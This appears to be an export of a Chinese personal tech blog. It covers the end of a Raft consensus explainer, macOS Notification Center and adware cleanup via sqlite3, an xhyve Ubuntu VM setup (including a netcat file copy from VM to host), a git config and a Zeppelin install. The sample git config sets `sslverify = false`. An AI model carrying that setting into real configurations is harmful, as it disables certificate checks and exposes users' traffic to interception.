<p>这时，两个节点的状态是<code>Candidate</code>，两个是<code>Follower</code>，但是他们的倒计时器仍然在运行，最先Timeout的那个节点会进行发起新一轮Term 3的投票。<br><img src="/images/raft/election_flow_mult_cand_6.png" alt="election_flow_mult_cand_6"></p>
<p>两个<code>Follower</code>在Term 3还没投过票，所以返回OK，这时<code>Candidate</code>一共有三票，被选为了<code>Leader</code>。<br><img src="/images/raft/election_flow_mult_cand_7.png" alt="election_flow_mult_cand_7"></p>
<p>如果<code>Leader</code> Heartbeat的时间晚于另外一个<code>Candidate</code> timeout的时间，另外一个<code>Candidate</code>仍然会发送选举请求。<br><img src="/images/raft/election_flow_mult_cand_8.png" alt="election_flow_mult_cand_8"></p>
<p>两个<code>Follower</code>已经投完票了，拒绝了这个<code>Candidate</code>的投票请求。<br><img src="/images/raft/election_flow_mult_cand_9.png" alt="election_flow_mult_cand_9"></p>
<p><code>Leader</code>进行Heartbeat，<code>Candidate</code>收到后状态自动转为<code>Follower</code>，完成选举。<br><img src="/images/raft/election_flow_mult_cand_10.png" alt="election_flow_mult_cand_10"></p>
<h1 id="日志复制"><a href="#日志复制" class="headerlink" title="日志复制"></a>日志复制</h1><p>Raft 在实际应用场景中的一致性更多的是体现在不同节点之间的数据一致性，客户端发送请求到任何一个节点都能收到一致的返回，当一个节点出故障后，其他节点仍然能以已有的数据正常进行。在选主之后的复制日志就是为了达到这个目的。</p>
<p><img src="/images/raft/log_replication_normal.jpg" alt="log_replication_normal"></p>
<h2 id="正常情况下日志复制过程"><a href="#正常情况下日志复制过程" class="headerlink" title="正常情况下日志复制过程"></a>正常情况下日志复制过程</h2><p><img src="/images/raft/log_replication_normal_step_1.png" alt="log_replication_normal_step_1"></p>
<p>客户端发送请求给<code>Leader</code>，储存数据 “sally”，<code>Leader</code>先将数据写在本地日志，这时候数据还是Uncommitted (还没最终确认，红色表示)<br><img src="/images/raft/log_replication_normal_step_2.png" alt="log_replication_normal_step_2"></p>
<p><code>Leader</code>给两个<code>Follower</code>发送AppendEntries请求，数据在<code>Follower</code>上没有冲突，则将数据暂时写在本地日志，<code>Follower</code>的数据也还是Uncommitted。<br><img src="/images/raft/log_replication_normal_step_3.png" alt="log_replication_normal_step_3"></p>
<p><code>Follower</code>将数据写到本地后，返回OK。<code>Leader</code>收到后成功返回，只要收到的成功的返回数量超过半数(包含<code>Leader</code>)，<code>Leader</code>将数据 “sally” 的状态改成Committed。( 这个时候<code>Leader</code>就可以返回给客户端了)<br><img src="/images/raft/log_replication_normal_step_4.png" alt="log_replication_normal_step_4"></p>
<p><code>Leader</code>再次给<code>Follower</code>发送AppendEntries请求，收到请求后，<code>Follower</code>将本地日志里Uncommitted数据改成Committed。这样就完成了一整个复制日志的过程，三个节点的数据是一致的<br><img src="/images/raft/log_replication_normal_step_5.png" alt="log_replication_normal_step_5"></p>
<h2 id="Network-Partition情况下日志复制过程"><a href="#Network-Partition情况下日志复制过程" class="headerlink" title="Network Partition情况下日志复制过程"></a>Network Partition情况下日志复制过程</h2><p>在Network Partition的情况下，部分节点之间没办法互相通信，Raft 也能保证在这种情况下数据的一致性。</p>
<p><img src="/images/raft/log_replication_np_1.png" alt="log_replication_np_1"></p>
<p>Network Partition将节点分成两边，一边有两个节点，一边三个节点。<br><img src="/images/raft/log_replication_np_2.png" alt="log_replication_np_2"></p>
<p>两个节点这边已经有<code>Leader</code>了，来自客户端的数据“bob”通过<code>Leader</code>同步到<code>Follower</code>。<br><img src="/images/raft/log_replication_np_3.png" alt="log_replication_np_3"></p>
<p>因为只有两个节点，少于3个节点，所以“bob”的状态仍是Uncommitted。所以在这里，服务器会返回错误给客户端<br><img src="/images/raft/log_replication_np_4.png" alt="log_replication_np_4"></p>
<p>另外一个Partition有三个节点，进行重新选主。客户端数据“tom”发到新的<code>Leader</code>，通过和上节网络状态下相似的过程，同步到另外两个<code>Follower</code>。<br><img src="/images/raft/log_replication_np_5.png" alt="log_replication_np_5"></p>
<p>因为这个Partition有3个节点，超过半数，所以数据“tom”都Commit了。<br><img src="/images/raft/log_replication_np_6.png" alt="log_replication_np_6"><br><img src="/images/raft/log_replication_np_7.png" alt="log_replication_np_7"><br><img src="/images/raft/log_replication_np_8.png" alt="log_replication_np_8"></p>
<p>网络状态恢复，5个节点再次处于同一个网络状态下。但是这里出现了数据冲突“bob”和“tom”<br><img src="/images/raft/log_replication_np_9.png" alt="log_replication_np_9"></p>
<p>三个节点的<code>Leader</code>广播AppendEntries<br><img src="/images/raft/log_replication_np_10.png" alt="log_replication_np_10"></p>
<p>两个节点Partition的<code>Leader</code>自动降级为<code>Follower</code>，因为这个Partition的数据 “bob” 没有Commit，返回给客户端的是错误，客户端知道请求没有成功，所以<code>Follower</code>在收到AppendEntries请求时，可以把“bob“删除，然后同步”tom”，通过这么一个过程，就完成了在Network Partition情况下的复制日志，保证了数据的一致性。<br><img src="/images/raft/log_replication_np_11.png" alt="log_replication_np_11"><br><img src="/images/raft/log_replication_np_12.png" alt="log_replication_np_12"></p>
<h1 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h1><h2 id="Election-safety"><a href="#Election-safety" class="headerlink" title="Election safety"></a>Election safety</h2><p>选举安全性，即任一任期内最多一个<code>leader</code>被选出。这一点非常重要，在一个复制集中任何时刻只能有一个<code>leader</code>。系统中同时有多余一个<code>leader</code>，被称之为脑裂（brain split），这是非常严重的问题，会导致数据的覆盖丢失。</p>
<ul>
<li>一个节点某一任期内最多只能投一票</li>
<li>只有获得多数票的节点才会成为<code>leader</code></li>
</ul>
<h2 id="log-matching"><a href="#log-matching" class="headerlink" title="log matching"></a>log matching</h2><p>如果两个节点上的某个log entry的log index相同且term相同，那么在该index之前的所有log entry应该都是相同的。在没有异常的情况下，log matching是很容易满足的，但如果出现了node crash，情况就会变得复杂了。</p>
<p><img src="/images/raft/safety_log_matching.png" alt="safety_log_matching"><br>*** 上图的a-f不是6个follower，而是某个follower可能存在的六个状态 ***</p>
<ul>
<li>比<code>leader</code>日志少: a,b</li>
<li>比<code>leader</code>日志多：c,d</li>
<li>某些位置比<code>leader</code>多，某些日志比<code>leader</code>少：e,f</li>
</ul>
<p>当出现了<code>leader</code>与<code>follower</code>不一致的情况，<code>leader</code>强制<code>follower</code>复制自己的log。</p>
<h2 id="leader-completeness"><a href="#leader-completeness" class="headerlink" title="leader completeness"></a>leader completeness</h2><ul>
<li>一个日志被复制到多数节点才算committed</li>
<li>一个节点得到多数的投票才能成为<code>leader</code>，而节点A给节点B投票的其中一个前提是，B的日志不能比A的日志旧</li>
</ul>
<h2 id="State-Machine-Safety"><a href="#State-Machine-Safety" class="headerlink" title="State Machine Safety"></a>State Machine Safety</h2><p>如果节点将某一位置的log entry应用到了状态机，那么其他节点在同一位置不能应用不同的日志。简单点来说，所有节点在同一位置（index in log entries）应该应用同样的日志。</p>
<p><img src="/images/raft/safety_state_machine.png" alt="safety_state_machine"></p>
<ul>
<li>(a)时刻, s1是leader，在term2提交的日志只赋值到了s1 s2两个节点就crash了。</li>
<li>(b)时刻, s5成为了term 3的<code>leader</code>，日志只赋值到了s5，然后crash。</li>
<li>(c)时刻，s1又成为了term 4的<code>leader</code>，开始赋值日志，于是把term2的日志复制到了s3，此刻，可以看出term2对应的日志已经被复制到了多数节点上，因此是committed，可以被状态机应用。</li>
<li>(d)时刻，s1又crash了，s5重新当选，然后将term3的日志复制到所有节点，这就出现了一种奇怪的现象：被复制到大多数节点（或者说可能已经应用）的日志被回滚。</li>
</ul>
<p>因为term4时的<code>leader</code> s1在(c)时刻提交了之前term2任期的日志。某个<code>leader</code>选举成功之后，不会直接提交前任<code>leader</code>时期的日志，而是通过提交当前任期的日志的时候“顺手”把之前的日志也提交了，具体怎么实现了，在log matching部分有详细介绍。那么问题来了，如果<code>leader</code>被选举后没有收到客户端的请求呢，论文中有提到，在任期开始的时候发立即尝试复制、提交一条空的log。</p>
<p>因此，在上图中，不会出现（C）时刻的情况，即term4任期的<code>leader</code> s1不会复制term2的日志到s3。而是如同(e)描述的情况，通过复制-提交term4的日志顺便提交term2的日志。如果term4的日志提交成功，那么term2的日志也一定提交成功，此时即使s1 crash，s5也不会重新当选。</p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="https://www.jianshu.com/p/8e4bbe7e276c">共识算法：Raft</a></li>
<li><a href="https://www.cnblogs.com/xybaby/p/10124083.html">一文搞懂Raft算法</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/32052223">Raft算法详解</a></li>
<li><a href="http://blog.itpub.net/31556438/viewspace-2637112/">10分钟弄懂Raft算法</a></li>
</ul>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>Raft</tag>
      </tags>
  </entry>
  <entry>
    <title>Mac中NotificationCenter残留应用删除</title>
    <url>/2017/02/20/apple/mac-notification-center-manage/</url>
    <content><![CDATA[<p>在mac系统的“设置”－“通知”中有很多应用标签，这些标签中有些是我们所需要的，有些是某某某流氓软件，强行装上的（流氓软件卸载后，该应用标签一直存在）。那么这个应用标签该如何清理呢？</p>
<p>上网找了好多方法，其中以删除<code>~/Library/Application Support/NotificationCenter/&lt;id&gt;</code>然后重启，这种方法最火。不知道这种方法实在osx（or macos）的哪个版本上的，本人mbp是<code>osx 10.11.6</code>，在我的mbp上没有<code>NotificationCenter</code>这个目录。对于没有这个目录的可以查看一下<code>getconf DARWIN_USER_DIR</code>这个目录。该目录下有个<code>com.apple.notificationcenter</code>目录，这个目录才是你要找到目录。</p>
<p>mac上NotificationCenter中的应用标签是存储在SQLite3数据库中的。可使用<code>sqlite3 \</code>getconf DARWIN_USER_DIR`com.apple.notificationcenter&#x2F;db&#x2F;db&#96;打开sqlite数据库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sqlite3 `getconf DARWIN_USER_DIR`com.apple.notificationcenter/db/db                                                                                     1 ↵</span></span><br><span class="line">SQLite version 3.8.10.2 2015-05-20 18:17:19</span><br><span class="line">Enter &quot;.help&quot; for usage hints.</span><br><span class="line"><span class="meta prompt_">sqlite&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后可用<code>.tables</code>查看库中的表</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">sqlite&gt; </span><span class="language-bash">.tables</span></span><br><span class="line">app_info                        notifications</span><br><span class="line">app_loc                         presented_alerts</span><br><span class="line">app_push                        presented_notifications</span><br><span class="line">app_source                      scheduled_notifications</span><br><span class="line">dbinfo                          today_summary_notifications</span><br><span class="line">notification_source             tomorrow_summary_notifications</span><br></pre></td></tr></table></figure>

<p>由于sqlite mode默认是list模式，需要将其改为line模式</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">sqlite&gt; </span><span class="language-bash">.show</span></span><br><span class="line">echo: off</span><br><span class="line">eqp: off</span><br><span class="line">explain: off</span><br><span class="line">headers: off</span><br><span class="line">mode: list</span><br><span class="line">nullvalue: &quot;&quot;</span><br><span class="line">output: stdout</span><br><span class="line">colseparator: &quot;|&quot;</span><br><span class="line">rowseparator: &quot;\n&quot;</span><br><span class="line">stats: off</span><br><span class="line">width:</span><br><span class="line"><span class="meta prompt_">sqlite&gt; </span><span class="language-bash">.mode line</span></span><br><span class="line"><span class="meta prompt_">sqlite&gt; </span><span class="language-bash">.show</span></span><br><span class="line">echo: off</span><br><span class="line">eqp: off</span><br><span class="line">explain: off</span><br><span class="line">headers: off</span><br><span class="line">mode: line</span><br><span class="line">nullvalue: &quot;&quot;</span><br><span class="line">output: stdout</span><br><span class="line">colseparator: &quot;|&quot;</span><br><span class="line">rowseparator: &quot;\n&quot;</span><br><span class="line">stats: off</span><br><span class="line">width:</span><br></pre></td></tr></table></figure>

<p>可用select查询<code>app_info</code>表，并删除想要删除的记录，然后重启系统，通知中的应用标签消失。</p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="https://www.v2ex.com/t/222943">Mac Notification Center 应用残留问题 求助</a></li>
</ul>
]]></content>
      <categories>
        <category>apple</category>
      </categories>
      <tags>
        <tag>mac</tag>
      </tags>
  </entry>
  <entry>
    <title>Mac通知中心自动推送SQLite Editor广告问题修改</title>
    <url>/2017/02/23/apple/mac-remove-sqlite-editor-app-intr/</url>
    <content><![CDATA[<p><img src="/images/apple/mac-sqlite-ad-bugfix.png" alt="mac-sqlite-ad-bugfix"></p>
<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>mac上有很多流氓软件，尤其是你通过非app store安装的时候。今天我遇到了这样一个问题，mac的通知中心通知我<code>Get it NOW!</code>，这是SQLite Editor的一个广告推送。频率为每天一次，记住当它提示你get的时候，千万别点，点了便每天会自动打开App Store ＋ Web来提示你购买。我操，真是烦死了。</p>
<h1 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h1><p>OS X 10.11.6</p>
<h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><ul>
<li>清理base-sqlite的推送程序<br>  在”&#x2F;Users&#x2F;zhoub&#x2F;Library&#x2F;Application Support”目录下，有一个”com.asoffertest.base-sqlite”目录，这里面的asoffer.py就是完成广告推送的罪魁祸首，不要由于果断将”com.asoffertest.base-sqlite”目录删除。</li>
<li>清理NotificationCenter数据库中的记录<br>  虽然清理了推送程序，但是通知中心中依然有推送程序的选项卡——一个叫python的选项卡。所以需要按照<a href="https://zhoubofsy.github.io/2017/02/20/apple/mac-notification-center-manage/">《Mac中NotificationCenter残留应用删除》</a>的方法清除“python选项卡”。</li>
<li>重启系统<br>  ……系统启动后，通知中心的选项卡中没有“python”了。</li>
</ul>
<h1 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h1><p>上诉的推送程序本人也不知道是装哪个软件装上的。但本人在<code>MPlayerX</code>官网上下载过osx安装包，并安装过。然后提示我已经安装了mackeeper，mackeeper可是个…以前就被这个mk（mackeeper）坑过，这次估计又是这厮搞得。</p>
<p>*** 以上纯属猜测，没有直接根据。***</p>
]]></content>
      <categories>
        <category>apple</category>
      </categories>
      <tags>
        <tag>mac</tag>
      </tags>
  </entry>
  <entry>
    <title>xhyve使用</title>
    <url>/2017/08/31/apple/xhyve-usage/</url>
    <content><![CDATA[<p><img src="/images/xhyve/xhyve_logo.png" alt="xhyve_logo"></p>
<p>FreeBSD 下的虚拟技术 bhyve (The BSD Hypervisor) 是去年1月份正式发布的，包含在了 FreeBSD 10.0 发行版中。今天要玩的这个 xhyve 是基于 bhyve 的 Mac OS X 移植版本，也就是说我们想在 Mac 上运行 Linux 的话除了 VirtualBox, VMware Fusion 外，现在有了第三种选择。</p>
<p>xhyve is a lightweight virtualization solution for OS X that is capable of running Linux. It is a port of FreeBSD’s bhyve, a KVM+QEMU alternative written by Peter Grehan and Neel Natu.</p>
<p>特点：</p>
<ul>
<li>super lightweight, only 230 KB in size</li>
<li>completely standalone, no dependencies</li>
<li>the only BSD-licensed virtualizer on OS X</li>
<li>does not require a kernel extension (bhyve’s kernel code was ported to user mode code calling into Hypervisor.framework)</li>
<li>multi-CPU support</li>
<li>networking support</li>
<li>can run off-the-shelf Linux distributions (and could be extended to run other operating systems)</li>
</ul>
<p>xhyve may make a good solution for running Docker on your Mac, for instance.</p>
<h1 id="install"><a href="#install" class="headerlink" title="install"></a>install</h1><p>search xhyver:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">brew info xhyve</span></span><br><span class="line">xhyve: stable 0.2.0 (bottled), HEAD</span><br><span class="line">xhyve, lightweight macOS virtualization solution based on FreeBSD&#x27;s bhyve</span><br><span class="line">https://github.com/mist64/xhyve</span><br><span class="line">/usr/local/Cellar/xhyve/HEAD-1f1dbe3 (11 files, 11.2MB) *</span><br><span class="line">  Built from source on 2017-08-24 at 12:12:21</span><br><span class="line">From: https://github.com/Homebrew/homebrew-core/blob/master/Formula/xhyve.rb</span><br><span class="line">==&gt; Requirements</span><br><span class="line">Required: macOS &gt;= 10.10 ✔</span><br></pre></td></tr></table></figure>

<p>install:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">brew install xhyve</span></span><br></pre></td></tr></table></figure>

<h1 id="Ubuntu-16-04-VM"><a href="#Ubuntu-16-04-VM" class="headerlink" title="Ubuntu 16.04 VM"></a>Ubuntu 16.04 VM</h1><p>下载<code>ubuntu-16.04.1-server-amd64.iso</code>，装载该iso，然后将其中的<code>vmlinuz</code>和<code>initrd.gz</code>复制出来，以供xhyve使用。</p>
<p>在mac系统下直接装载ubuntu的iso会出错</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">hdiutil attach ./ubuntu-16.04.1-server-amd64.iso</span></span><br><span class="line">hdiutil: attach failed - 无可装载的文件系统</span><br></pre></td></tr></table></figure>
<p>所以需要制作一个新的iso，新的iso文件前预留<code>2KB</code>的空间</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/zero bs=2k count=1 of=./tmp.iso</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">dd</span> <span class="keyword">if</span>=./ubuntu-16.04.1-server-amd64.iso bs=2k skip=1 &gt;&gt; ./tmp.iso</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">hdiutil attach ./tmp.iso</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cp</span> /Volumes/Ubuntu-Server\ 16/install/vmlinuz .</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cp</span> /Volumes/Ubuntu-Server\ 16/install/initrd.gz .</span></span><br></pre></td></tr></table></figure>

<p>创建一个磁盘映像文件<code>hdd.img</code>，当作虚拟机的虚拟硬盘</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/zero of=hdd.img bs=1g count=8</span></span><br></pre></td></tr></table></figure>

<p>编写VM创建脚本<code>mk_xhyve.sh</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">KERNEL=&quot;vmlinuz&quot;</span><br><span class="line">INITRD=&quot;initrd.gz&quot;</span><br><span class="line">CMDLINE=&quot;earlyprintk=serial console=ttyS0 acpi=off&quot;</span><br><span class="line"></span><br><span class="line">MEM=&quot;-m 1G&quot;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">SMP=<span class="string">&quot;-c 2&quot;</span></span></span><br><span class="line">NET=&quot;-s 2:0,virtio-net&quot;</span><br><span class="line">IMG_CD=&quot;-s 3,ahci-cd,./ubuntu-16.04.1-server-amd64.iso&quot;</span><br><span class="line">IMG_HDD=&quot;-s 4,virtio-blk,./hdd.img&quot;</span><br><span class="line">PCI_DEV=&quot;-s 0:0,hostbridge -s 31,lpc&quot;</span><br><span class="line">LPC_DEV=&quot;-l com1,stdio&quot;</span><br><span class="line"></span><br><span class="line">xhyve $MEM $SMP $PCI_DEV $LPC_DEV $NET $IMG_CD $IMG_HDD -f kexec,$KERNEL,$INITRD,&quot;$CMDLINE&quot;</span><br></pre></td></tr></table></figure>

<p>运行VM创建脚本<code>sudo sh ./mk_xhyve.sh</code>创建ubuntu虚拟机</p>
<p><img src="/images/xhyve/xhyve_vm_run.png" alt="xhyve_vm_run"></p>
<p>按正常系统安装方法安装。。。<br>待成功安装完成后选择<code>&lt;Go Back&gt;</code> &#x3D;&gt; <code>Execute a shell</code>，进入iso的shell界面，然后需要将已经安装好的<code>hdd.img</code>也就是系统中的<code>/dev/vda</code>中的boot目录copy出来，因为要用里面的<code>vmlinuz-4.4.0-31-generic</code>和<code>initrd.img-4.4.0-31-generic</code></p>
<p>进入shell后先查看一下ip地址</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">BusyBox v1.22.1 (Ubuntu 1:1.22.0-15ubuntu1) built-in shell (ash)</span><br><span class="line">Enter &#x27;help&#x27; for a list of built-in commands.</span><br><span class="line"></span><br><span class="line">~ # ip a</span><br><span class="line">1: lo: &lt;LOOPBACK&gt; mtu 65536 qdisc noop qlen 1</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">2: enp0s2: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop qlen 1000</span><br><span class="line">    link/ether 82:62:9e:40:cf:32 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">~ #</span><br></pre></td></tr></table></figure>
<p>发现没有获取到ip地址，此时shell用的是busybox，是没有<code>dhclient</code>的，不过busybox提供<code>udhcpc -i &lt;interface&gt;</code>。<br>获取到ip地址后，vm可以通过<code>tar c ./boot | nc -l -p 1234</code>将boot目录发送给宿主机，宿主机用<code>nc &lt;vm ip&gt; 1234 | tar x</code>接受boot目录。</p>
<p>获得到boot目录后取出其中的<code>vmlinuz-4.4.0-31-generic</code>和<code>initrd.img-4.4.0-31-generic</code>，然后修改VM创建脚本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">KERNEL=&quot;vmlinuz-4.4.0-31-generic&quot;</span><br><span class="line">INITRD=&quot;initrd.img-4.4.0-31-generic&quot;</span><br><span class="line">CMDLINE=&quot;earlyprintk=serial console=ttyS0 acpi=off root=/dev/vda1&quot;</span><br><span class="line"></span><br><span class="line">MEM=&quot;-m 1G&quot;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">SMP=<span class="string">&quot;-c 2&quot;</span></span></span><br><span class="line">NET=&quot;-s 2:0,virtio-net&quot;</span><br><span class="line">IMG_CD=&quot;-s 3,ahci-cd,./ubuntu-16.04.1-server-amd64.iso&quot;</span><br><span class="line">IMG_HDD=&quot;-s 4,virtio-blk,./hdd.img&quot;</span><br><span class="line">PCI_DEV=&quot;-s 0:0,hostbridge -s 31,lpc&quot;</span><br><span class="line">LPC_DEV=&quot;-l com1,stdio&quot;</span><br><span class="line"></span><br><span class="line">xhyve $MEM $SMP $PCI_DEV $LPC_DEV $NET $IMG_CD $IMG_HDD -f kexec,$KERNEL,$INITRD,&quot;$CMDLINE&quot;</span><br></pre></td></tr></table></figure>
<p>并执行<code>sudo sh ./mk_xhyve.sh</code></p>
<p><img src="/images/xhyve/xhyve_vm_run2.png" alt="xhyve_vm_run2"></p>
<p>ubuntu 16.04 正常启动了，over！</p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="https://github.com/mist64/xhyve">xhyve.org</a></li>
<li><a href="http://www.pagetable.com/?p=831">xhyve – Lightweight Virtualization on OS X Based on bhyve</a></li>
<li><a href="http://www.vpsee.com/2015/06/mac-os-x-hypervisor-xhyve-based-on-bhyve/">Mac OS X 上基于 FreeBSD&#x2F;bhyve 的虚拟技术 xhyve</a></li>
<li><a href="https://www.v2ex.com/t/359038">在 Mac OS 的 Xhyve 引擎之上启动 LinuxKit 的玩法</a></li>
</ul>
]]></content>
      <categories>
        <category>apple</category>
      </categories>
      <tags>
        <tag>mac</tag>
        <tag>vm</tag>
        <tag>xhyve</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>git使用配置</title>
    <url>/2016/04/14/git/git-usage-config-md/</url>
    <content><![CDATA[<h2 id="git配置"><a href="#git配置" class="headerlink" title="git配置"></a>git配置</h2><p>配置文件 ”~&#x2F;.gitconfig“</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">[user]</span><br><span class="line">    email = zhoubofsy@hotmail.com</span><br><span class="line">    name = zhoubofsy</span><br><span class="line">[alias]</span><br><span class="line">    lg = log --color --graph --pretty=format:&#x27;%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset&#x27; --abbrev-commit</span><br><span class="line">[http]</span><br><span class="line">    proxy = http://127.0.0.1:8087</span><br><span class="line">    sslverify = false</span><br><span class="line">[https]</span><br><span class="line">    proxy = http://127.0.0.1:8087</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>git</category>
      </categories>
      <tags>
        <tag>git</tag>
        <tag>config</tag>
      </tags>
  </entry>
  <entry>
    <title>Zeppelin 搭建配置及使用</title>
    <url>/2017/08/29/bigdata/zeppelin-usage/</url>
    <content><![CDATA[<p><img src="/images/zeppelin/zeppelin_logo.png" alt="zeppelin_logo"></p>
<p>Apache Zeppelin是一个让交互式数据分析变得可行的基于网页的开源框架。Zeppelin提供了数据分析、数据可视化等功能。Zeppelin 是一个提供交互数据分析且基于Web的笔记本。方便你做出可数据驱动的、可交互且可协作的精美文档，并且支持多种语言，包括 Scala(使用 Apache Spark)、Python(Apache Spark)、SparkSQL、 Hive、 Markdown、Shell等等。</p>
<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>采用docker环境部署zeppelin</p>
<p>OS：CentOS 7.3.1611<br>JAVA：OpenJDK 1.8<br>zeppelin: 0.7.2</p>
<p>dockerfile:</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos:<span class="number">7.3</span>.<span class="number">1611</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">MAINTAINER</span> zhoub</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> yum update -y</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> yum install -y java-1.8.0-openjdk.x86_64</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;JAVA_HOME=/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.141-1.b16.el7_3.x86_64/jre&quot;</span> | <span class="built_in">tee</span> -a /etc/bashrc</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;export JAVA_HOME&quot;</span> | <span class="built_in">tee</span> -a /etc/bashrc</span></span><br></pre></td></tr></table></figure>


<h1 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h1><p>从<a href="http://zeppelin.apache.org/download.html">zeppelin官网</a>或github上下载，推荐下载最新版。解压tar包，然后在准备好的环境中运行<code>zeppelin/bin/zeppelin-daemon.sh start</code></p>
<p>docker:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">cmd=&quot;/root/run/entry.sh&quot;</span><br><span class="line">image=&quot;centos7.3:java1.8&quot;</span><br><span class="line">net=&quot;hadoop_net&quot;</span><br><span class="line"></span><br><span class="line">docker run -d --rm -w /root/ -v $&#123;PWD&#125;/run:/root/run -v $&#123;PWD&#125;/zeppelin:/root/zeppelin -v $&#123;PWD&#125;/hbase:/root/hbase -p 8080 --network $&#123;net&#125; -h zeppelin --name zeppelin $&#123;image&#125; $&#123;cmd&#125;</span><br></pre></td></tr></table></figure>

<p>entry.sh:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">/root/zeppelin/bin/zeppelin-daemon.sh start</span><br><span class="line"></span><br><span class="line">while true</span><br><span class="line">do</span><br><span class="line">    sleep 10s</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<h1 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h1><p><img src="/images/zeppelin/zeppelin_arch.jpg" alt="zeppelin_arch"><br>Zeppelin具有客户端&#x2F;服务器架构，客户端一般就是指浏览器。服务器接收客户端的请求，并将请求通过Thrift协议发送给翻译器组。翻译器组物理表现为JVM进程，负责实际处理客户端的请求并与服务器进行通信。</p>
<p><img src="/images/zeppelin/zeppelin_interpreter_arch.jpg" alt="zeppelin_interpreter_arch"><br>翻译器是一个插件式的体系结构，允许任何语言&#x2F;后端数据处理程序以插件的形式添加到Zeppelin中。当前的Zeppelin已经支持<a href="http://zeppelin.apache.org/docs/0.7.2/manual/interpreters.html">很多翻译器</a>。插件式架构允许用户在Zeppelin中使用自己熟悉的特定程序语言或数据处理方式。例如，通过使用%spark翻译器，可以在Zeppelin中使用Scala语言代码。</p>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>zeppelin的配置主要指interpreter的设置，然后note通过配置好的interpreter进行解释执行。</p>
<h2 id="JDBC-hive配置"><a href="#JDBC-hive配置" class="headerlink" title="JDBC-hive配置"></a>JDBC-hive配置</h2><p>zeppelin想要通过jdbc连接hive需要对hive、hdfs、zeppelin三者进行配置</p>
<h3 id="hive"><a href="#hive" class="headerlink" title="hive"></a>hive</h3><p>需要在hive节点上启动<code>hiveserver2</code>服务<code>nohup /shared-disk/apache-hive-2.1.1-bin/bin/hive --service hiveserver2&amp;</code></p>
